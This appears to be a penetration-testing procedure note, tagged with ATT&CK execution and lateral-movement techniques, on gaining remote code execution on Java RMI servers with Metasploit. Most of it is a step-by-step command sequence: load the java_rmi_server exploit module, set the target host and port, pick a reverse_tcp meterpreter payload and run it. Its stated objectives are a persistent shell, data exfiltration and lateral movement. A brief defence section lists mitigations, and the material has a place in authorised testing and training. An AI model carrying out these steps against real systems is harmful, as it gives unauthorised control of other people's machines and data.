---
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:00.970641+00:00'
updated_at: '2023-04-06T03:56:00.983999+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Exploitation]]'
  - '[[tags/Java RMI]]'
  - '[[tags/RCE using Metasploit]]'
commands:
  - '[[commands/msfconsole-java-rmi-server-exploit]]'
platforms:
  - Linux
  - Java
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Java-RMI-Server-RCE-using-Metasploit

## Summary

This procedure exploits vulnerabilities in Java Remote Method Invocation (RMI) servers using the Metasploit framework to achieve remote code execution (RCE) on the target system. It targets misconfigured or outdated Java RMI services, allowing an attacker to execute arbitrary commands and gain a shell for further post-exploitation activities.

## Description

Java RMI enables communication between Java Virtual Machines over a network, but insecure configurations can expose endpoints to exploitation. This procedure leverages Metasploit's java_rmi_server module, which sends crafted RMI requests to invoke methods that lead to code execution. It is effective against enterprise environments running vulnerable Java applications, such as legacy web services or internal tools. Success depends on the RMI server being accessible and not firewalled. Upon exploitation, a payload is delivered, establishing a reverse shell or meterpreter session for control.

## Requirements

1. Network access to the target Java RMI server (typically on port 1099 or custom).
2. Metasploit Framework installed on the attacker's machine (Kali Linux recommended).
3. Knowledge of the target's IP address and RMI port.
4. Optional: Custom payload configuration for specific architectures (e.g., Windows or Linux meterpreter).

## Defense

Defensive measures and detection strategies:

- Ensure Java RMI servers are bound to localhost or behind firewalls; disable unnecessary RMI exposure.
- Apply patches to Java runtime environments and monitor for outdated versions.
- Use network segmentation to isolate RMI services and implement application whitelisting.
- Monitor for anomalous outbound connections from Java processes and log RMI traffic for anomalies like unexpected method invocations.

## Objectives

1. Exploit the Java RMI service to execute arbitrary code remotely.
2. Establish a persistent shell or session on the target system.
3. Enable further actions like data exfiltration or lateral movement.

## Instructions

### Step 1: Launch Metasploit Console

**Context**: Start the Metasploit Framework console to access exploit modules. This provides the interactive environment needed to configure and run the exploit.

**Command** ([[commands/msfconsole-launch]]):
```bash
msfconsole
```

> This opens the msfconsole prompt. Verify by seeing the 'msf6 >' banner. If Metasploit is not in PATH, navigate to its directory first.

### Step 2: Select and Configure the Java RMI Exploit Module

**Context**: Load the specific exploit module for Java RMI servers and set the target parameters. This prepares the module by specifying the remote host and port where the RMI service is running.

**Command** ([[commands/msfconsole-java-rmi-server-exploit]]):
```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS $_TARGET_IP
set RPORT $_TARGET_PORT
```

> Replace $_TARGET_IP with the target's IP (e.g., 192.168.1.100) and $_TARGET_PORT with the RMI port (default 1099). Expected output: Confirmation messages like 'RHOSTS => 192.168.1.100' and 'RPORT => 1099'. Use 'show options' to verify settings.

### Step 3: Configure Payload and Execute the Exploit

**Context**: Optionally set a custom payload for the desired shell type, then run the exploit to send the malicious RMI request and trigger code execution.

**Command** ([[commands/msfconsole-set-payload-and-run]]):
```bash
set PAYLOAD $_PAYLOAD
exploit
```

> Common payloads include 'windows/meterpreter/reverse_tcp' for Windows targets or 'linux/x64/meterpreter/reverse_tcp' for Linux. If no custom payload is needed, skip the set command and run 'exploit' directly. Expected output: Progress messages, followed by a successful session if vulnerable (e.g., 'Meterpreter session 1 opened'). If it fails, check firewall or version compatibility.
